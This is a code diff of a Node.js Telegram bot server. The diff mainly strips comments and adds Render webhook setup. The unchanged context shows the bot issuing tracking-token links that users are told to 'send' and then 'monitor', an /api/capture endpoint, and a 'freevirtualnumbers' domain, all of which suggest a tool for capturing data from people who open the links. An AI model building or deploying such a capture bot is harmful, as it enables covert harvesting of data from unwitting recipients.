@@ -1,3 +1,4 @@
+// server.js
 const { Telegraf, Markup } = require("telegraf");
 const express = require("express");
 const bodyParser = require("body-parser");
@@ -17,11 +18,9 @@ const DOMAIN = process.env.RENDER_EXTERNAL_URL
   : "https://freevirtualnumbers.orender.com";
 
 // ===== User Tracking =====
-// token -> { chat_id, username, createdAt }
 const activeUsers = {};
-const TOKEN_EXPIRY_MS = 10 * 60 * 1000; // 10 minutes
+const TOKEN_EXPIRY_MS = 10 * 60 * 1000; // 10 min
 
-// Clean expired tokens every 2 minutes
 setInterval(() => {
   const now = Date.now();
   for (const token in activeUsers) {
@@ -31,7 +30,6 @@ setInterval(() => {
   }
 }, 2 * 60 * 1000);
 
-// Generate token
 function generateToken() {
   return crypto.randomBytes(8).toString("hex"); // 16 char
 }
@@ -78,7 +76,6 @@ Select a module below to begin.
   );
 });
 
-// ===== Pool Mode =====
 bot.action("pool", async (ctx) => {
   await ctx.answerCbQuery();
   const token = generateToken();
@@ -108,7 +105,6 @@ Send this link and monitor interactions.
   );
 });
 
-// ===== Normal Mode =====
 bot.action("normal", async (ctx) => {
   await ctx.answerCbQuery();
   const token = generateToken();
@@ -138,7 +134,6 @@ Deploy and observe activity.
   );
 });
 
-// Stats, Info, Dev, Back (same as before)
 bot.action("stats", async (ctx) => {
   await ctx.answerCbQuery();
   await ctx.reply(`
@@ -223,6 +218,16 @@ app.post("/api/capture", async (req, res) => {
   }
 });
 
-// ===== Start Server =====
+// ===== Webhook for Render =====
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
+
+if (!RENDER_EXTERNAL_URL) console.warn("RENDER_EXTERNAL_URL not set — webhook may fail!");
+
+bot.telegram.setWebhook(`${RENDER_EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`);
+app.use(bot.webhookCallback(`/bot${process.env.BOT_TOKEN}`));
+
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+  console.log(`Telegram webhook set at ${RENDER_EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`);
+});
